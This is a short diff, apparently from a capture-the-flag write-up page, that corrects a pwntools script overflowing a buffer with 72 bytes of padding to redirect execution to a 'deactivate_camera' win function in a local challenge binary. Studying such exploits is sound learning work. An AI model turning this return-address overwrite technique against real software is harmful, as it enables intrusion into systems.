@@ -155,9 +155,9 @@ io = elf.process()
 
 win_function_addr = elf.sym[&quot;deactivate_camera&quot;]
 
-payload = b&quot;A&quot; * 72 + win_function_addr 
+payload = b&quot;A&quot; * 72 + p64(win_function_addr) 
 
-io.sendlineafter(b&quot;&gt; &quot;, 1)
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
 io.sendlineafter(b&quot;&gt; &quot;, payload)
 io.interactive()
 </code></pre>
